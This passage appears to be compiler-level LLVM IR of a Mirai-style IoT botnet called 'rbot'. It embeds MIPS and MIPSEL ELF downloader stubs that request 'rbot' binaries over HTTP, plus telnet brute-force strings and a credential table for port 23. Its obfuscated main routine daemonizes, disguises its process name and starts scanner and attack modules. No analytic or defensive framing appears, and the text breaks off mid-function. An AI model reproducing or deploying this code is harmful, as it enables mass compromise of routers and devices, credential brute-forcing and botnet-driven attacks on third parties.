!\8F\99\80@\00\00\00\00\03 \00\08\00\00\00\00\00\00\00\00<\1C\00\05'\9C\80\A0\03\99\E0!'\BD\FF\E0\AF\BF\00\1C\AF\B0\00\18\AF\BC\00\10\8F\99\804\00\00\00\00\03 \F8\09\00\80\80!\8F\BC\00\10\ACP\00\00\8F\BF\00\1C\8F\B0\00\18$\02\FF\FF\03\E0\00\08'\BD\00 \00\00\00\00\00\00\00\00<\1C\00\05'\9C\80P\03\99\E0!\8F\82\800\03\E0\00\08\00\00\00\00\00\00\00\00\00\00\00\00mips\00\00\00\00.rbot.binary\00\00\00\00GET /rbot.mips HTTP/1.0\0D\0A\0D\0A\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\80\00\00\00\00@\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00D\06 \00@\05`\00@\01\9C\00@\02\10\00@\05\10\00@\01(\00@\01t\00@\00\A0\00@\01\C4\00@\00\C8\00@\00\E4\00@\04\A0\00@\01\00\00.shstrtab\00.text\00.rodata\00.got\00.bss\00.mdebug.abi32\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00@\00\A0\00\00\00\A0\00\00\04\E0\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00@\05\80\00\00\05\80\00\00\004\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\01\10\00\00\03\00D\05\C0\00\00\05\C0\00\00\00T\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\04\00\00\00\1E\00\00\00\08\00\00\00\03\00D\06 \00\00\06\14\00\00\00\10\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00#\00\00\00\01\00\00\00\00\00\00\00H\00\00\06\14\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\06\14\00\00\001\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00", align 1
@.str.19 = private unnamed_addr constant [1921 x i8] c"\7FELF\01\01\01\00\00\00\00\00\00\00\00\00\02\00\08\00\01\00\00\00\84\04@\004\00\00\00h\06\00\00\07\10\00\004\00 \00\03\00(\00\07\00\06\00\01\00\00\00\00\00\00\00\00\00@\00\00\00@\00\D4\05\00\00\D4\05\00\00\05\00\00\00\00\00\01\00\01\00\00\00\E0\05\00\00\E0\05D\00\E0\05D\00T\00\00\00p\00\00\00\06\00\00\00\00\00\01\00Q\E5td\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\07\00\00\00\04\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\FF\00\A50\00,\05\00\00&\04\00% \85\00\FF\00\E70\FF\00\C60% \87\00\002\06\00%0\C4\00\02\22\06\00\00\FF\C30\00\1A\03\00\00\FF\840\00\16\06\00\026\06\00%\10C\00%0\C4\00\08\00\E0\03%\10F\00\05\00\1C<\E4\84\9C'!\E0\99\03\5C\80\99\8F!(\80\00\08\00 \03\A1\0F\04$\05\00\1C<\C8\84\9C'!\E0\99\03\5C\80\99\8F!(\80\00\08\00 \03\A6\0F\04$\05\00\1C<\AC\84\9C'!\E0\99\03!\10\A0\00\5C\80\99\8F!8\C0\00!(\80\00!0@\00\08\00 \03\A5\0F\04$\05\00\1C<\84\84\9C'!\E0\99\03\D0\FF\BD'(\00\BF\AF\10\00\BC\AF\5C\80\99\8F\18\00\A4\AF\1C\00\A5\AF \00\A6\AF\06\10\04$\18\00\A6'\09\F8 \03\03\00\05$\10\00\BC\8F(\00\BF\8F\00\00\00\00\08\00\E0\030\00\BD'\05\00\1C<8\84\9C'!\E0\99\03!\10\A0\00\5C\80\99\8F!8\C0\00!(\80\00!0@\00\08\00 \03\A4\0F\04$\05\00\1C<\10\84\9C'!\E0\99\03!\10\A0\00\5C\80\99\8F!8\C0\00!(\80\00!0@\00\08\00 \03\A3\0F\04$\05\00\1C<\E8\83\9C'!\E0\99\03\D0\FF\BD'(\00\BF\AF\10\00\BC\AF\5C\80\99\8F\18\00\A4\AF\1C\00\A5\AF \00\A6\AF\06\10\04$\18\00\A6'\09\F8 \03\01\00\05$\10\00\BC\8F(\00\BF\8F\00\00\00\00\08\00\E0\030\00\BD'\05\00\1C<\9C\83\9C'!\E0\99\03@\FF\BD'\BC\00\BF\AF\B8\00\B2\AF\B4\00\B1\AF\B0\00\B0\AF\10\00\BC\AF\18\80\82\8F\00\00\00\00\A0\05P$\00\00\02\82\00\00\00\00\FD\FF@\14\01\00\10&\FF\FF\10&\02\00\02$\1C\00\A2\A7\00P\02$\1E\00\A2\A7\18\80\82\8FL\80\99\8F\D0\00\07$\B0\00\04$k\00\05$\85\00\06$\A0\05B$\09\F8 \03#\80\02\02\10\00\BC\8F\01\03\05$\18\80\84\8F`\80\99\8F\A8\05\84$\FF\01\06$\09\F8 \03 \00\A2\AF\10\00\BC\8F\02\00\04$P\80\99\8F\02\00\05$!0\00\00\09\F8 \03!\90@\00!\88@\00\FF\FF\02$\10\00\BC\8F\03\00\22\12\00\00\00\00\07\00B\16\00\00\00\00T\80\99\8F\00\00\00\00\09\F8 \03\01\00\04$\10\00\BC\8F\00\00\00\00D\80\99\8F!  \02\1C\00\A5'\09\F8 \03\10\00\06$\10\00\BC\8F\07\00A\04\00\00\00\00T\80\99\8F\00\00\00\00\09\F8 \03# \02\00\10\00\BC\8F\00\00\00\00\18\80\85\8FH\80\99\8F\17\00\10&\B8\05\A5$!  \02\09\F8 \03!0\00\02\10\00\BC\8F\07\00P\10!\80\00\00T\80\99\8F\00\00\00\00\09\F8 \03\03\00\04$\10\00\BC\8F!\80\00\008\80\99\8F!  \02\18\00\A5'\09\F8 \03\01\00\06$\10\00\BC\8F\01\00\03$T\80\99\8F\04\00C\10\04\00\04$\09\F8 \03\00\00\00\00\10\00\BC\8F\18\00\A3\83\00\12\10\00%\80C\00\0A\0D\02<\0A\0DB4\ED\FF\02\16\00\00\00\008\80\99\8F,\00\B0'!  \02!(\00\02\09\F8 \03\80\00\06$\10\00\BC\8F!(\00\02H\80\99\8F!0@\00\06\00@\18! @\02\09\F8 \03\00\00\00\00\10\00\BC\8F\F0\FF\00\10\00\00\00\00X\80\99\8F\00\00\00\00\09\F8 \03!  \02\10\00\BC\8F\00\00\00\00X\80\99\8F\00\00\00\00\09\F8 \03! @\02\10\00\BC\8F\00\00\00\00T\80\99\8F\00\00\00\00\09\F8 \03\05\00\04$\10\00\BC\8F\BC\00\BF\8F\B8\00\B2\8F\B4\00\B1\8F\B0\00\B0\8F\08\00\E0\03\C0\00\BD'\05\00\1C<L\81\9C'!\E0\99\03!\00\E0\03\01\00\11\04\00\00\00\00\05\00\1C<4\81\9C'!\E0\9F\03!\F8\00\00<\80\99\8F\00\00\00\00\08\00 \03\00\00\00\00\00\00\00\00\05\00\1C<\10\81\9C'!\E0\99\03!\10\80\00! \A0\00!(\C0\00!0\E0\00\10\00\A7\8F\14\00\A8\8F\18\00\A9\8F\1C\00\AA\8F\E0\FF\BD'\10\00\A8\AF\14\00\A9\AF\18\00\AA\AF\1C\00\A2\AF\1C\00\A2\8F\0C\00\00\00\03\00\E0\14 \00\BD'\08\00\E0\03\00\00\00\00! @\00@\80\99\8F\00\00\00\00\08\00 \03\00\00\00\00\00\00\00\00\05\00\1C<\A0\80\9C'!\E0\99\03\E0\FF\BD'\1C\00\BF\AF\18\00\B0\AF\10\00\BC\AF4\80\99\8F\00\00\00\00\09\F8 \03!\80\80\00\10\00\BC\8F\00\00P\AC\1C\00\BF\8F\18\00\B0\8F\FF\FF\02$\08\00\E0\03 \00\BD'\00\00\00\00\00\00\00\00\05\00\1C<P\80\9C'!\E0\99\030\80\82\8F\08\00\E0\03\00\00\00\00\00\00\00\00\00\00\00\00mpsl\00\00\00\00.rbot.binary\00\00\00\00GET /rbot.mpsl HTTP/1.0\0D\0A\0D\0A\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\80\00\00@\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00@\06D\00\80\05@\00\C0\01@\004\02@\000\05@\00L\01@\00\98\01@\00\A0\00@\00\E8\01@\00\EC\00@\00\08\01@\00\C0\04@\00$\01@\00\00.shstrtab\00.text\00.rodata\00.got\00.bss\00.mdebug.abi32\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\00\00\A0\00@\00\A0\00\00\00\00\05\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\00\00\A0\05@\00\A0\05\00\004\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\01\00\00\00\03\00\00\10\E0\05D\00\E0\05\00\00T\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\04\00\00\00\1E\00\00\00\08\00\00\00\03\00\00\00@\06D\004\06\00\00\10\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00#\00\00\00\01\00\00\00\00\00\00\00H\00\00\004\06\00\00\00\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\004\06\00\001\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00", align 1
@.str.148 = private unnamed_addr constant [11 x i8] c"sage: wget\00", align 1
@.str.149 = private unnamed_addr constant [11 x i8] c"sage: tftp\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.1.5 = private unnamed_addr constant [6 x i8] c"/var/\00", align 1
@.str.2.6 = private unnamed_addr constant [6 x i8] c"/dev/\00", align 1
@.str.3.7 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.4.8 = private unnamed_addr constant [10 x i8] c"/var/run/\00", align 1
@.str.5 = private unnamed_addr constant [10 x i8] c"/var/tmp/\00", align 1
@.str.6 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.7 = private unnamed_addr constant [15 x i8] c"/dev/netslink/\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"/dev/shm/\00", align 1
@.str.9 = private unnamed_addr constant [6 x i8] c"/bin/\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"/etc/\00", align 1
@.str.11 = private unnamed_addr constant [7 x i8] c"/boot/\00", align 1
@.str.12 = private unnamed_addr constant [6 x i8] c"/usr/\00", align 1
@.str.13 = private unnamed_addr constant [11 x i8] c"/var/Sofia\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.128 = private unnamed_addr constant [9 x i8] c"FINISHED\00", align 1
@.str.129 = private unnamed_addr constant [7 x i8] c"BRUTED\00", align 1
@.str.127 = private unnamed_addr constant [68 x i8] c"[%d.%d.%d.%d:23] [%s:%s] [%s] [Status:%s] [Method:%d] [Attempt #%d]\00", align 1
@.str.136 = private unnamed_addr constant [6 x i8] c"ARMv7\00", align 1
@.str.137 = private unnamed_addr constant [6 x i8] c"ARMv6\00", align 1
@.str.138 = private unnamed_addr constant [5 x i8] c"arm7\00", align 1
@.str.131 = private unnamed_addr constant [5 x i8] c"\7FELF\00", align 1
@.str.132 = private unnamed_addr constant [6 x i8] c"arm64\00", align 1
@.str.133 = private unnamed_addr constant [4 x i8] c"x86\00", align 1
@.str.134 = private unnamed_addr constant [5 x i8] c"mips\00", align 1
@.str.135 = private unnamed_addr constant [7 x i8] c"mipsel\00", align 1
@.str.139 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.140 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.141 = private unnamed_addr constant [10 x i8] c"ncomplete\00", align 1
@.str.142 = private unnamed_addr constant [15 x i8] c"attempt failed\00", align 1
@.str.143 = private unnamed_addr constant [6 x i8] c"% Bad\00", align 1
@.str.15 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.144 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.145 = private unnamed_addr constant [6 x i8] c"enter\00", align 1
@.str.146 = private unnamed_addr constant [4 x i8] c"ser\00", align 1
@.str.147 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@consume_iacs.tmp1 = private unnamed_addr constant [3 x i8] c"\FF\FB\1F", align 1
@consume_iacs.tmp2 = private unnamed_addr constant [9 x i8] c"\FF\FA\1F\00P\00\18\FF\F0", align 1
@auth_table_max_weight = global i16 0, align 2
@auth_table_len = global i32 0, align 4
@auth_table = global %struct.scanner_auth* null, align 8

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [32 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.__sigset_t, align 8
  %10 = alloca %struct.__sigset_t, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i16, align 2
  %20 = alloca %struct.sockaddr_in, align 4
  %21 = alloca i32, align 4
  %22 = alloca %union.__SOCKADDR_ARG, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i16, align 2
  %28 = alloca [1024 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %8, align 4
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 0
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @unlink(i8* %31) #7
  %33 = call i32 @sigemptyset(%struct.__sigset_t* %9) #7
  %34 = call i32 @sigaddset(%struct.__sigset_t* %9, i32 2) #7
  %35 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %9, %struct.__sigset_t* null) #7
  %36 = call void (i32)* @signal(i32 17, void (i32)* inttoptr (i64 1 to void (i32)*)) #7
  %37 = call void (i32)* @signal(i32 1, void (i32)* inttoptr (i64 1 to void (i32)*)) #7
  %38 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i32 0, i32 0)) #7
  call void @table_init()
  call void @ensure_single_instance()
  call void @rand_init()
  %39 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 32, i32 16, i1 false)
  %40 = load i32, i32* %4, align 4
  store i32 %40, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -402082401, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -402082401, label %first
    i32 970998474, label %43
    i32 622955890, label %50
    i32 -1114332001, label %64
    i32 -1228019099, label %67
    i32 -2142882373, label %77
    i32 1555303687, label %78
    i32 -1567677749, label %83
    i32 -1526668978, label %84
    i32 -1928413974, label %90
    i32 -254989768, label %91
    i32 1023864178, label %100
    i32 715792011, label %101
    i32 964055526, label %110
    i32 -981989055, label %114
    i32 121907847, label %126
    i32 431193374, label %130
    i32 -1268916501, label %131
    i32 168599238, label %135
    i32 -1601657145, label %147
    i32 -1891990240, label %159
    i32 -747317654, label %164
    i32 1888886428, label %166
    i32 -1717530710, label %168
    i32 -930988642, label %177
    i32 -1185120979, label %178
    i32 -346457809, label %182
    i32 246166636, label %188
    i32 80685667, label %192
    i32 -650888454, label %193
    i32 -232622952, label %194
    i32 -1104702784, label %198
    i32 -159666765, label %212
    i32 1187521544, label %224
    i32 -448319217, label %228
    i32 -1733677614, label %242
    i32 -2022213729, label %243
    i32 -1093505813, label %250
    i32 1252604871, label %257
    i32 1371571417, label %270
    i32 1927593165, label %276
    i32 -308265394, label %277
    i32 422394360, label %278
    i32 -504435176, label %279
    i32 -970911990, label %283
    i32 -1223373458, label %297
    i32 1241544300, label %306
    i32 1641266834, label %311
    i32 -480670146, label %316
    i32 94638183, label %321
    i32 -362502234, label %322
    i32 -143878718, label %323
    i32 164645441, label %324
    i32 -2061739856, label %328
    i32 923860877, label %329
    i32 -2053675915, label %334
    i32 -316666525, label %338
    i32 693458450, label %345
    i32 1221545778, label %348
    i32 -187961576, label %359
    i32 -978178944, label %364
    i32 -1975094857, label %369
    i32 -861045604, label %374
    i32 -1639936497, label %375
    i32 -526400506, label %376
    i32 273435281, label %377
    i32 1757583462, label %381
    i32 1523328843, label %382
    i32 1366026441, label %397
    i32 -581712254, label %401
    i32 2106439173, label %402
    i32 2046567952, label %403
    i32 -571937132, label %404
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %41 = icmp eq i32 %.reload, 2
  %42 = select i1 %41, i32 970998474, i32 -1114332001
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i8**, i8*** %5, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 1
  %46 = load i8*, i8** %45, align 8
  %47 = call i32 @util_strlen(i8* %46)
  %48 = icmp slt i32 %47, 32
  %49 = select i1 %48, i32 622955890, i32 -1114332001
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %52 = load i8**, i8*** %5, align 8
  %53 = getelementptr inbounds i8*, i8** %52, i64 1
  %54 = load i8*, i8** %53, align 8
  %55 = call i32 @util_strcpy(i8* %51, i8* %54)
  %56 = load i8**, i8*** %5, align 8
  %57 = getelementptr inbounds i8*, i8** %56, i64 1
  %58 = load i8*, i8** %57, align 8
  %59 = load i8**, i8*** %5, align 8
  %60 = getelementptr inbounds i8*, i8** %59, i64 1
  %61 = load i8*, i8** %60, align 8
  %62 = call i32 @util_strlen(i8* %61)
  %63 = sext i32 %62 to i64
  call void @llvm.memset.p0i8.i64(i8* %58, i8 0, i64 %63, i32 1, i1 false)
  store i32 -1228019099, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %66 = call i32 @util_strcpy(i8* %65, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i32 0, i32 0))
  store i32 -1228019099, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i8**, i8*** %5, align 8
  %69 = getelementptr inbounds i8*, i8** %68, i64 0
  %70 = load i8*, i8** %69, align 8
  %71 = call i32 @util_strcpy(i8* %70, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.2, i32 0, i32 0))
  %72 = call i32 (i32, ...) @prctl(i32 15, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.2, i32 0, i32 0)) #7
  %73 = call i32 @fork() #7
  store i32 %73, i32* @pid1, align 4
  %74 = load i32, i32* @pid1, align 4
  %75 = icmp ne i32 %74, 0
  %76 = select i1 %75, i32 -2142882373, i32 1555303687
  store i32 %76, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  call void @exit(i32 1) #8
  unreachable

; <label>:78:                                     ; preds = %loopEntry
  %79 = call i32 @fork() #7
  store i32 %79, i32* @pid2, align 4
  %80 = load i32, i32* @pid2, align 4
  %81 = icmp ne i32 %80, 0
  %82 = select i1 %81, i32 -1567677749, i32 -1526668978
  store i32 %82, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  call void @exit(i32 1) #8
  unreachable

; <label>:84:                                     ; preds = %loopEntry
  %85 = call i32 @setsid() #7
  store i32 %85, i32* %7, align 4
  %86 = call i32 @close(i32 0)
  %87 = call i32 @close(i32 1)
  %88 = call i32 @close(i32 2)
  %89 = call signext i8 @attack_init()
  call void (...) bitcast (void ()* @scanner_init to void (...)*)()
  store i32 -1928413974, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  store i32 -254989768, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %93 = getelementptr inbounds [16 x i64], [16 x i64]* %92, i64 0, i64 0
  %94 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %93) #7, !srcloc !1
  %95 = extractvalue { i64, i64* } %94, 0
  %96 = extractvalue { i64, i64* } %94, 1
  %97 = trunc i64 %95 to i32
  store i32 %97, i32* %15, align 4
  %98 = ptrtoint i64* %96 to i64
  %99 = trunc i64 %98 to i32
  store i32 %99, i32* %16, align 4
  store i32 1023864178, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  store i32 715792011, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %103 = getelementptr inbounds [16 x i64], [16 x i64]* %102, i64 0, i64 0
  %104 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %103) #7, !srcloc !2
  %105 = extractvalue { i64, i64* } %104, 0
  %106 = extractvalue { i64, i64* } %104, 1
  %107 = trunc i64 %105 to i32
  store i32 %107, i32* %17, align 4
  %108 = ptrtoint i64* %106 to i64
  %109 = trunc i64 %108 to i32
  store i32 %109, i32* %18, align 4
  store i32 964055526, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %111 = load i32, i32* @fd_ctrl, align 4
  %112 = icmp ne i32 %111, -1
  %113 = select i1 %112, i32 -981989055, i32 121907847
  store i32 %113, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i32, i32* @fd_ctrl, align 4
  %116 = srem i32 %115, 64
  %117 = zext i32 %116 to i64
  %118 = shl i64 1, %117
  %119 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %120 = load i32, i32* @fd_ctrl, align 4
  %121 = sdiv i32 %120, 64
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds [16 x i64], [16 x i64]* %119, i64 0, i64 %122
  %124 = load i64, i64* %123, align 8
  %125 = or i64 %124, %118
  store i64 %125, i64* %123, align 8
  store i32 121907847, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = load i32, i32* @fd_serv, align 4
  %128 = icmp eq i32 %127, -1
  %129 = select i1 %128, i32 431193374, i32 -1268916501
  store i32 %129, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  call void @establish_connection()
  store i32 -1268916501, i32* %switchVar
  br label %loopEnd

; <label>:131:                                    ; preds = %loopEntry
  %132 = load i8, i8* @pending_connection, align 1
  %133 = icmp ne i8 %132, 0
  %134 = select i1 %133, i32 168599238, i32 -1601657145
  store i32 %134, i32* %switchVar
  br label %loopEnd

; <label>:135:                                    ; preds = %loopEntry
  %136 = load i32, i32* @fd_serv, align 4
  %137 = srem i32 %136, 64
  %138 = zext i32 %137 to i64
  %139 = shl i64 1, %138
  %140 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %141 = load i32, i32* @fd_serv, align 4
  %142 = sdiv i32 %141, 64
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds [16 x i64], [16 x i64]* %140, i64 0, i64 %143
  %145 = load i64, i64* %144, align 8
  %146 = or i64 %145, %139
  store i64 %146, i64* %144, align 8
  store i32 -1891990240, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  %148 = load i32, i32* @fd_serv, align 4
  %149 = srem i32 %148, 64
  %150 = zext i32 %149 to i64
  %151 = shl i64 1, %150
  %152 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %153 = load i32, i32* @fd_serv, align 4
  %154 = sdiv i32 %153, 64
  %155 = sext i32 %154 to i64
  %156 = getelementptr inbounds [16 x i64], [16 x i64]* %152, i64 0, i64 %155
  %157 = load i64, i64* %156, align 8
  %158 = or i64 %157, %151
  store i64 %158, i64* %156, align 8
  store i32 -1891990240, i32* %switchVar
  br label %loopEnd

; <label>:159:                                    ; preds = %loopEntry
  %160 = load i32, i32* @fd_ctrl, align 4
  %161 = load i32, i32* @fd_serv, align 4
  %162 = icmp sgt i32 %160, %161
  %163 = select i1 %162, i32 -747317654, i32 1888886428
  store i32 %163, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i32, i32* @fd_ctrl, align 4
  store i32 %165, i32* %13, align 4
  store i32 -1717530710, i32* %switchVar
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
  %167 = load i32, i32* @fd_serv, align 4
  store i32 %167, i32* %13, align 4
  store i32 -1717530710, i32* %switchVar
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  %169 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %169, align 8
  %170 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 10, i64* %170, align 8
  %171 = load i32, i32* %13, align 4
  %172 = add nsw i32 %171, 1
  %173 = call i32 @select(i32 %172, %struct.__sigset_t* %10, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %173, i32* %14, align 4
  %174 = load i32, i32* %14, align 4
  %175 = icmp eq i32 %174, -1
  %176 = select i1 %175, i32 -930988642, i32 -1185120979
  store i32 %176, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  store i32 -1928413974, i32* %switchVar
  br label %loopEnd

; <label>:178:                                    ; preds = %loopEntry
  %179 = load i32, i32* %14, align 4
  %180 = icmp eq i32 %179, 0
  %181 = select i1 %180, i32 -346457809, i32 -650888454
  store i32 %181, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  store i16 0, i16* %19, align 2
  %183 = load i32, i32* %8, align 4
  %184 = add nsw i32 %183, 1
  store i32 %184, i32* %8, align 4
  %185 = srem i32 %183, 6
  %186 = icmp eq i32 %185, 0
  %187 = select i1 %186, i32 246166636, i32 80685667
  store i32 %187, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  %189 = load i32, i32* @fd_serv, align 4
  %190 = bitcast i16* %19 to i8*
  %191 = call i64 @send(i32 %189, i8* %190, i64 2, i32 16384)
  store i32 80685667, i32* %switchVar
  br label %loopEnd

; <label>:192:                                    ; preds = %loopEntry
  store i32 -650888454, i32* %switchVar
  br label %loopEnd

; <label>:193:                                    ; preds = %loopEntry
  store i32 -232622952, i32* %switchVar
  br label %loopEnd

; <label>:194:                                    ; preds = %loopEntry
  %195 = load i32, i32* @fd_ctrl, align 4
  %196 = icmp ne i32 %195, -1
  %197 = select i1 %196, i32 -1104702784, i32 1187521544
  store i32 %197, i32* %switchVar
  br label %loopEnd

; <label>:198:                                    ; preds = %loopEntry
  %199 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %200 = load i32, i32* @fd_ctrl, align 4
  %201 = sdiv i32 %200, 64
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds [16 x i64], [16 x i64]* %199, i64 0, i64 %202
  %204 = load i64, i64* %203, align 8
  %205 = load i32, i32* @fd_ctrl, align 4
  %206 = srem i32 %205, 64
  %207 = zext i32 %206 to i64
  %208 = shl i64 1, %207
  %209 = and i64 %204, %208
  %210 = icmp ne i64 %209, 0
  %211 = select i1 %210, i32 -159666765, i32 1187521544
  store i32 %211, i32* %switchVar
  br label %loopEnd

; <label>:212:                                    ; preds = %loopEntry
  store i32 16, i32* %21, align 4
  %213 = load i32, i32* @fd_ctrl, align 4
  %214 = bitcast %union.__SOCKADDR_ARG* %22 to %struct.sockaddr**
  %215 = bitcast %struct.sockaddr_in* %20 to %struct.sockaddr*
  store %struct.sockaddr* %215, %struct.sockaddr** %214, align 8
  %216 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %22, i32 0, i32 0
  %217 = load %struct.sockaddr*, %struct.sockaddr** %216, align 8
  %218 = call i32 @accept(i32 %213, %struct.sockaddr* %217, i32* %21)
  call void @scanner_kill()
  %219 = load i32, i32* @maintain_thread, align 4
  %220 = call i32 @kill(i32 %219, i32 9) #7
  call void @attack_kill_all()
  %221 = load i32, i32* %7, align 4
  %222 = mul nsw i32 %221, -1
  %223 = call i32 @kill(i32 %222, i32 9) #7
  call void @exit(i32 0) #8
  unreachable

; <label>:224:                                    ; preds = %loopEntry
  %225 = load i8, i8* @pending_connection, align 1
  %226 = icmp ne i8 %225, 0
  %227 = select i1 %226, i32 -448319217, i32 -504435176
